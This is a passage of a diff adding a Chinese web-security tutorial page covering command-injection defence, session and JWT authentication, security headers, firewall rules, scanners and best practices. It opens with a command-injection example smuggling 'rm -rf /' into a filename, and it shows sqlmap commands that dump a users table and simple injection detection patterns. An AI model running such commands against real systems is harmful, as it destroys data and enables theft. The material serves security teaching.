+<span class="c1"># file=important.txt; rm -rf /</span>
+<span class="c1"># 执行：cat important.txt; rm -rf /</span>
+</pre></div>
+</div>
+<p><strong>防御</strong>：</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="c1"># 1. 避免使用shell</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">subprocess</span>
+<span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s1">&#39;cat&#39;</span><span class="p">,</span> <span class="n">filename</span><span class="p">],</span> <span class="n">shell</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+
+<span class="c1"># 2. 白名单验证</span>
+<span class="n">allowed_files</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;file1.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;file2.txt&#39;</span><span class="p">]</span>
+<span class="k">if</span> <span class="n">filename</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">allowed_files</span><span class="p">:</span>
+    <span class="k">return</span> <span class="s2">&quot;Invalid file&quot;</span>
+
+<span class="c1"># 3. 使用库函数而不是命令</span>
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</pre></div>
+</div>
+</section>
+</section>
+<hr class="docutils" />
+<section id="id10">
+<h2>4. 身份认证<a class="headerlink" href="#id10" title="Link to this heading"></a></h2>
+<section id="session">
+<h3>4.1 Session认证<a class="headerlink" href="#session" title="Link to this heading"></a></h3>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">request</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+<span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="s1">&#39;secret-key-here&#39;</span>
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">login</span><span class="p">():</span>
+    <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span>
+    
+    <span class="k">if</span> <span class="n">verify_user</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+        <span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">get_user_id</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+        <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;message&#39;</span><span class="p">:</span> <span class="s1">&#39;Login successful&#39;</span><span class="p">}</span>
+    
+    <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="s1">&#39;Invalid credentials&#39;</span><span class="p">},</span> <span class="mi">401</span>
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/profile&#39;</span><span class="p">)</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">profile</span><span class="p">():</span>
+    <span class="k">if</span> <span class="s1">&#39;user_id&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
+        <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="s1">&#39;Unauthorized&#39;</span><span class="p">},</span> <span class="mi">401</span>
+    
+    <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;user_id&#39;</span><span class="p">:</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">]}</span>
+</pre></div>
+</div>
+</section>
+<section id="jwt">
+<h3>4.2 JWT认证<a class="headerlink" href="#jwt" title="Link to this heading"></a></h3>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span><span class="w"> </span><span class="nn">jwt</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">datetime</span><span class="w"> </span><span class="kn">import</span> <span class="n">datetime</span><span class="p">,</span> <span class="n">timedelta</span>
+
+<span class="n">SECRET_KEY</span> <span class="o">=</span> <span class="s1">&#39;your-secret-key&#39;</span>
+
+<span class="c1"># 生成Token</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">generate_token</span><span class="p">(</span><span class="n">user_id</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">&#39;user_id&#39;</span><span class="p">:</span> <span class="n">user_id</span><span class="p">,</span>
+        <span class="s1">&#39;exp&#39;</span><span class="p">:</span> <span class="n">datetime</span><span class="o">.</span><span class="n">utcnow</span><span class="p">()</span> <span class="o">+</span> <span class="n">timedelta</span><span class="p">(</span><span class="n">hours</span><span class="o">=</span><span class="mi">24</span><span class="p">),</span>
+        <span class="s1">&#39;iat&#39;</span><span class="p">:</span> <span class="n">datetime</span><span class="o">.</span><span class="n">utcnow</span><span class="p">()</span>
+    <span class="p">}</span>
+    <span class="n">token</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">SECRET_KEY</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s1">&#39;HS256&#39;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">token</span>
+
+<span class="c1"># 验证Token</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">verify_token</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">SECRET_KEY</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;HS256&#39;</span><span class="p">])</span>
+        <span class="k">return</span> <span class="n">payload</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">]</span>
+    <span class="k">except</span> <span class="n">jwt</span><span class="o">.</span><span class="n">ExpiredSignatureError</span><span class="p">:</span>
+        <span class="k">return</span> <span class="kc">None</span>  <span class="c1"># Token过期</span>
+    <span class="k">except</span> <span class="n">jwt</span><span class="o">.</span><span class="n">InvalidTokenError</span><span class="p">:</span>
+        <span class="k">return</span> <span class="kc">None</span>  <span class="c1"># Token无效</span>
+
+<span class="c1"># 使用</span>
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">login</span><span class="p">():</span>
+    <span class="c1"># 验证用户...</span>
+    <span class="n">token</span> <span class="o">=</span> <span class="n">generate_token</span><span class="p">(</span><span class="n">user_id</span><span class="p">)</span>
+    <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;token&#39;</span><span class="p">:</span> <span class="n">token</span><span class="p">}</span>
+
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/profile&#39;</span><span class="p">)</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">profile</span><span class="p">():</span>
+    <span class="n">token</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;Authorization&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;Bearer &#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
+    <span class="n">user_id</span> <span class="o">=</span> <span class="n">verify_token</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+    
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">user_id</span><span class="p">:</span>
+        <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;error&#39;</span><span class="p">:</span> <span class="s1">&#39;Unauthorized&#39;</span><span class="p">},</span> <span class="mi">401</span>
+    
+    <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;user_id&#39;</span><span class="p">:</span> <span class="n">user_id</span><span class="p">}</span>
+</pre></div>
+</div>
+</section>
+<section id="oauth-2-0">
+<h3>4.3 OAuth 2.0<a class="headerlink" href="#oauth-2-0" title="Link to this heading"></a></h3>
+<p><strong>流程</strong>：</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>1. 客户端 → 授权服务器：请求授权
+2. 用户登录并授权
+3. 授权服务器 → 客户端：返回授权码
+4. 客户端 → 授权服务器：用授权码换取访问令牌
+5. 客户端 → 资源服务器：用访问令牌访问资源
+</pre></div>
+</div>
+</section>
+</section>
+<hr class="docutils" />
+<section id="id11">
+<h2>5. 常见安全头部<a class="headerlink" href="#id11" title="Link to this heading"></a></h2>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="c1"># 1. Content-Security-Policy (CSP)</span>
+<span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Content-Security-Policy&#39;</span><span class="p">]</span> <span class="o">=</span> \
+    <span class="s2">&quot;default-src &#39;self&#39;; script-src &#39;self&#39; &#39;unsafe-inline&#39;&quot;</span>
+
+<span class="c1"># 2. X-Frame-Options (防止点击劫持)</span>
+<span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;X-Frame-Options&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;DENY&#39;</span>
+
+<span class="c1"># 3. X-Content-Type-Options</span>
+<span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;X-Content-Type-Options&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;nosniff&#39;</span>
+
+<span class="c1"># 4. Strict-Transport-Security (HSTS)</span>
+<span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Strict-Transport-Security&#39;</span><span class="p">]</span> <span class="o">=</span> \
+    <span class="s1">&#39;max-age=31536000; includeSubDomains&#39;</span>
+
+<span class="c1"># 5. X-XSS-Protection</span>
+<span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;X-XSS-Protection&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;1; mode=block&#39;</span>
+
+<span class="c1"># 6. Referrer-Policy</span>
+<span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Referrer-Policy&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;strict-origin-when-cross-origin&#39;</span>
+
+<span class="c1"># 7. Permissions-Policy</span>
+<span class="n">response</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Permissions-Policy&#39;</span><span class="p">]</span> <span class="o">=</span> \
+    <span class="s1">&#39;geolocation=(), microphone=(), camera=()&#39;</span>
+</pre></div>
+</div>
+</section>
+<hr class="docutils" />
+<section id="id12">
+<h2>6. 防火墙和端口管理<a class="headerlink" href="#id12" title="Link to this heading"></a></h2>
+<section id="iptables">
+<h3>6.1 iptables<a class="headerlink" href="#iptables" title="Link to this heading"></a></h3>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># 查看规则</span>
+$<span class="w"> </span>sudo<span class="w"> </span>iptables<span class="w"> </span>-L<span class="w"> </span>-n<span class="w"> </span>-v
+
+<span class="c1"># 允许SSH</span>
+$<span class="w"> </span>sudo<span class="w"> </span>iptables<span class="w"> </span>-A<span class="w"> </span>INPUT<span class="w"> </span>-p<span class="w"> </span>tcp<span class="w"> </span>--dport<span class="w"> </span><span class="m">22</span><span class="w"> </span>-j<span class="w"> </span>ACCEPT
+
+<span class="c1"># 允许HTTP/HTTPS</span>
+$<span class="w"> </span>sudo<span class="w"> </span>iptables<span class="w"> </span>-A<span class="w"> </span>INPUT<span class="w"> </span>-p<span class="w"> </span>tcp<span class="w"> </span>--dport<span class="w"> </span><span class="m">80</span><span class="w"> </span>-j<span class="w"> </span>ACCEPT
+$<span class="w"> </span>sudo<span class="w"> </span>iptables<span class="w"> </span>-A<span class="w"> </span>INPUT<span class="w"> </span>-p<span class="w"> </span>tcp<span class="w"> </span>--dport<span class="w"> </span><span class="m">443</span><span class="w"> </span>-j<span class="w"> </span>ACCEPT
+
+<span class="c1"># 允许已建立的连接</span>
+$<span class="w"> </span>sudo<span class="w"> </span>iptables<span class="w"> </span>-A<span class="w"> </span>INPUT<span class="w"> </span>-m<span class="w"> </span>state<span class="w"> </span>--state<span class="w"> </span>ESTABLISHED,RELATED<span class="w"> </span>-j<span class="w"> </span>ACCEPT
+
+<span class="c1"># 默认拒绝其他入站</span>
+$<span class="w"> </span>sudo<span class="w"> </span>iptables<span class="w"> </span>-P<span class="w"> </span>INPUT<span class="w"> </span>DROP
+
+<span class="c1"># 允许所有出站</span>
+$<span class="w"> </span>sudo<span class="w"> </span>iptables<span class="w"> </span>-P<span class="w"> </span>OUTPUT<span class="w"> </span>ACCEPT
+
+<span class="c1"># 保存规则</span>
+$<span class="w"> </span>sudo<span class="w"> </span>iptables-save<span class="w"> </span>&gt;<span class="w"> </span>/etc/iptables/rules.v4
+</pre></div>
+</div>
+</section>
+<section id="ufw-ubuntu">
+<h3>6.2 ufw（Ubuntu）<a class="headerlink" href="#ufw-ubuntu" title="Link to this heading"></a></h3>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># 启用防火墙</span>
+$<span class="w"> </span>sudo<span class="w"> </span>ufw<span class="w"> </span><span class="nb">enable</span>
+
+<span class="c1"># 允许SSH</span>
+$<span class="w"> </span>sudo<span class="w"> </span>ufw<span class="w"> </span>allow<span class="w"> </span><span class="m">22</span>
+
+<span class="c1"># 允许HTTP/HTTPS</span>
+$<span class="w"> </span>sudo<span class="w"> </span>ufw<span class="w"> </span>allow<span class="w"> </span><span class="m">80</span>
+$<span class="w"> </span>sudo<span class="w"> </span>ufw<span class="w"> </span>allow<span class="w"> </span><span class="m">443</span>
+
+<span class="c1"># 允许特定IP的SSH</span>
+$<span class="w"> </span>sudo<span class="w"> </span>ufw<span class="w"> </span>allow<span class="w"> </span>from<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>to<span class="w"> </span>any<span class="w"> </span>port<span class="w"> </span><span class="m">22</span>
+
+<span class="c1"># 拒绝端口</span>
+$<span class="w"> </span>sudo<span class="w"> </span>ufw<span class="w"> </span>deny<span class="w"> </span><span class="m">23</span>
+
+<span class="c1"># 查看状态</span>
+$<span class="w"> </span>sudo<span class="w"> </span>ufw<span class="w"> </span>status
+
+<span class="c1"># 删除规则</span>
+$<span class="w"> </span>sudo<span class="w"> </span>ufw<span class="w"> </span>delete<span class="w"> </span>allow<span class="w"> </span><span class="m">80</span>
+</pre></div>
+</div>
+</section>
+</section>
+<hr class="docutils" />
+<section id="id13">
+<h2>7. 安全扫描工具<a class="headerlink" href="#id13" title="Link to this heading"></a></h2>
+<section id="nikto-web">
+<h3>7.1 Nikto（Web扫描）<a class="headerlink" href="#nikto-web" title="Link to this heading"></a></h3>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># 扫描网站</span>
+$<span class="w"> </span>nikto<span class="w"> </span>-h<span class="w"> </span>https://example.com
+
+<span class="c1"># 扫描特定端口</span>
+$<span class="w"> </span>nikto<span class="w"> </span>-h<span class="w"> </span>https://example.com<span class="w"> </span>-p<span class="w"> </span><span class="m">8080</span>
+
+<span class="c1"># 输出到文件</span>
+$<span class="w"> </span>nikto<span class="w"> </span>-h<span class="w"> </span>https://example.com<span class="w"> </span>-o<span class="w"> </span>scan.html<span class="w"> </span>-Format<span class="w"> </span>html
+</pre></div>
+</div>
+</section>
+<section id="owasp-zap">
+<h3>7.2 OWASP ZAP<a class="headerlink" href="#owasp-zap" title="Link to this heading"></a></h3>
+<p><strong>功能</strong>：Web应用安全扫描</p>
+<p><strong>使用</strong>：</p>
+<ol class="arabic simple">
+<li><p>配置浏览器代理到ZAP</p></li>
+<li><p>浏览目标网站（被动扫描）</p></li>
+<li><p>主动扫描</p></li>
+<li><p>查看发现的漏洞</p></li>
+</ol>
+</section>
+<section id="sqlmap-sql">
+<h3>7.3 SQLMap（SQL注入测试）<a class="headerlink" href="#sqlmap-sql" title="Link to this heading"></a></h3>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># 测试URL</span>
+$<span class="w"> </span>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://example.com/page?id=1&quot;</span>
+
+<span class="c1"># 测试POST请求</span>
+$<span class="w"> </span>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://example.com/login&quot;</span><span class="w"> </span>--data<span class="o">=</span><span class="s2">&quot;username=admin&amp;password=pass&quot;</span>
+
+<span class="c1"># 列出数据库</span>
+$<span class="w"> </span>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://example.com/page?id=1&quot;</span><span class="w"> </span>--dbs
+
+<span class="c1"># 列出表</span>
+$<span class="w"> </span>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://example.com/page?id=1&quot;</span><span class="w"> </span>-D<span class="w"> </span>database_name<span class="w"> </span>--tables
+
+<span class="c1"># 导出数据</span>
+$<span class="w"> </span>sqlmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://example.com/page?id=1&quot;</span><span class="w"> </span>-D<span class="w"> </span>db<span class="w"> </span>-T<span class="w"> </span>users<span class="w"> </span>--dump
+</pre></div>
+</div>
+</section>
+</section>
+<hr class="docutils" />
+<section id="id14">
+<h2>8. 最佳实践<a class="headerlink" href="#id14" title="Link to this heading"></a></h2>
+<section id="id15">
+<h3>8.1 密码安全<a class="headerlink" href="#id15" title="Link to this heading"></a></h3>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="c1"># 1. 使用强哈希算法</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">bcrypt</span>
+<span class="n">hashed</span> <span class="o">=</span> <span class="n">bcrypt</span><span class="o">.</span><span class="n">hashpw</span><span class="p">(</span><span class="n">password</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">bcrypt</span><span class="o">.</span><span class="n">gensalt</span><span class="p">())</span>
+
+<span class="c1"># 2. 密码强度要求</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">check_password_strength</span><span class="p">(</span><span class="n">password</span><span class="p">):</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">password</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">:</span>
+        <span class="k">return</span> <span class="kc">False</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;[A-Z]&#39;</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+        <span class="k">return</span> <span class="kc">False</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;[a-z]&#39;</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+        <span class="k">return</span> <span class="kc">False</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;[0-9]&#39;</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+        <span class="k">return</span> <span class="kc">False</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;[!@#$%^&amp;*]&#39;</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+        <span class="k">return</span> <span class="kc">False</span>
+    <span class="k">return</span> <span class="kc">True</span>
+
+<span class="c1"># 3. 密码重置</span>
+<span class="c1"># 使用临时令牌，设置过期时间</span>
+<span class="n">token</span> <span class="o">=</span> <span class="n">secrets</span><span class="o">.</span><span class="n">token_urlsafe</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
+<span class="n">expires</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span> <span class="o">+</span> <span class="n">timedelta</span><span class="p">(</span><span class="n">hours</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+</pre></div>
+</div>
+</section>
+<section id="id16">
+<h3>8.2 输入验证<a class="headerlink" href="#id16" title="Link to this heading"></a></h3>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="c1"># 1. 白名单验证</span>
+<span class="n">ALLOWED_EXTENSIONS</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;txt&#39;</span><span class="p">,</span> <span class="s1">&#39;pdf&#39;</span><span class="p">,</span> <span class="s1">&#39;png&#39;</span><span class="p">,</span> <span class="s1">&#39;jpg&#39;</span><span class="p">}</span>
+<span class="k">if</span> <span class="n">file</span><span class="o">.</span><span class="n">filename</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">ALLOWED_EXTENSIONS</span><span class="p">:</span>
+    <span class="k">return</span> <span class="s2">&quot;Invalid file type&quot;</span>
+
+<span class="c1"># 2. 长度限制</span>
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">username</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">50</span><span class="p">:</span>
+    <span class="k">return</span> <span class="s2">&quot;Username too long&quot;</span>
+
+<span class="c1"># 3. 类型检查</span>
+<span class="k">if</span> <span class="ow">not</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">age</span><span class="p">,</span> <span class="nb">int</span><span class="p">)</span> <span class="ow">or</span> <span class="n">age</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="ow">or</span> <span class="n">age</span> <span class="o">&gt;</span> <span class="mi">150</span><span class="p">:</span>
+    <span class="k">return</span> <span class="s2">&quot;Invalid age&quot;</span>
+
+<span class="c1"># 4. 正则表达式</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
+<span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;^[\w\.-]+@[\w\.-]+\.\w+$&#39;</span><span class="p">,</span> <span class="n">email</span><span class="p">):</span>
+    <span class="k">return</span> <span class="s2">&quot;Invalid email&quot;</span>
+</pre></div>
+</div>
+</section>
+<section id="id17">
+<h3>8.3 日志和监控<a class="headerlink" href="#id17" title="Link to this heading"></a></h3>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span><span class="w"> </span><span class="nn">logging</span>
+
+<span class="c1"># 配置日志</span>
+<span class="n">logging</span><span class="o">.</span><span class="n">basicConfig</span><span class="p">(</span>
+    <span class="n">filename</span><span class="o">=</span><span class="s1">&#39;security.log&#39;</span><span class="p">,</span>
+    <span class="n">level</span><span class="o">=</span><span class="n">logging</span><span class="o">.</span><span class="n">WARNING</span><span class="p">,</span>
+    <span class="nb">format</span><span class="o">=</span><span class="s1">&#39;</span><span class="si">%(asctime)s</span><span class="s1"> </span><span class="si">%(levelname)s</span><span class="s1">: </span><span class="si">%(message)s</span><span class="s1">&#39;</span>
+<span class="p">)</span>
+
+<span class="c1"># 记录可疑活动</span>
+<span class="nd">@app</span><span class="o">.</span><span class="n">before_request</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">log_request</span><span class="p">():</span>
+    <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span><span class="si">}</span><span class="s2"> - </span><span class="si">{</span><span class="n">request</span><span class="o">.</span><span class="n">method</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">request</span><span class="o">.</span><span class="n">path</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    
+    <span class="c1"># 检测可疑请求</span>
+    <span class="k">if</span> <span class="s1">&#39;union&#39;</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;q&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">lower</span><span class="p">():</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Potential SQL injection from </span><span class="si">{</span><span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    
+    <span class="k">if</span> <span class="s1">&#39;&lt;script&gt;&#39;</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">get_data</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">():</span>
+        <span class="n">logging</span><span class="o">.</span><span class="n">warning</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Potential XSS from </span><span class="si">{</span><span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</pre></div>
+</div>
+</section>
+</section>
+<hr class="docutils" />
+<section id="id18">
+<h2>9. 常见问题<a class="headerlink" href="#id18" title="Link to this heading"></a></h2>
+<section id="q1-https">
+<h3>Q1: HTTPS就一定安全吗？<a class="headerlink" href="#q1-https" title="Link to this heading"></a></h3>
+<p><strong>A</strong>:</p>
+<ul class="simple">
+<li><p>HTTPS加密传输，但不保证服务器安全</p></li>
+<li><p>证书可能被伪造（中间人攻击）</p></li>
+<li><p>应用层漏洞仍然存在</p></li>
+</ul>
+</section>
+<section id="q2-jwt-vs-session">
+<h3>Q2: JWT vs Session？<a class="headerlink" href="#q2-jwt-vs-session" title="Link to this heading"></a></h3>
+<p><strong>A</strong>:</p>
+<ul class="simple">
+<li><p><strong>JWT</strong>: 无状态、跨域、可扩展</p></li>
+<li><p><strong>Session</strong>: 服务器控制、可撤销、更安全</p></li>
+</ul>
+</section>
+<section id="q3-ddos">
+<h3>Q3: 如何防止DDoS？<a class="headerlink" href="#q3-ddos" title="Link to this heading"></a></h3>
+<p><strong>A</strong>:</p>
+<ol class="arabic simple">
+<li><p>限流（Rate Limiting）</p></li>
+<li><p>CDN和负载均衡</p></li>
+<li><p>防火墙规则</p></li>
+<li><p>云服务商的DDoS防护</p></li>
+</ol>
+</section>
+<section id="q4">
+<h3>Q4: 安全更新频率？<a class="headerlink" href="#q4" title="Link to this heading"></a></h3>
+<p><strong>A</strong>:</p>
+<ul class="simple">
+<li><p>操作系统：每月</p></li>
+<li><p>应用程序：有更新立即安装</p></li>
+<li><p>库和依赖：定期检查（npm audit, pip-audit）</p></li>
+</ul>
+</section>
+</section>
+<hr class="docutils" />
+<section id="id19">
+<h2>参考资源<a class="headerlink" href="#id19" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p>OWASP Top 10</p></li>
+<li><p>CWE/SANS Top 25</p></li>
+<li><p>《Web应用安全权威指南》</p></li>
+<li><p>Mozilla Security Guidelines</p></li>
+<li><p>Let’s Encrypt（免费HTTPS证书）</p></li>
+</ul>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer><div class="rst-footer-buttons" role="navigation" aria-label="页脚">
+        <a href="index.html" class="btn btn-neutral float-left" title="网络安全基础" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> 上一页</a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; 版权所有 2025, Code Dojo。</p>
+  </div>
+
+  利用 <a href="https://www.sphinx-doc.org/">Sphinx</a> 构建，使用的 
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">主题</a>
+    由 <a href="https://readthedocs.org">Read the Docs</a> 开发.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
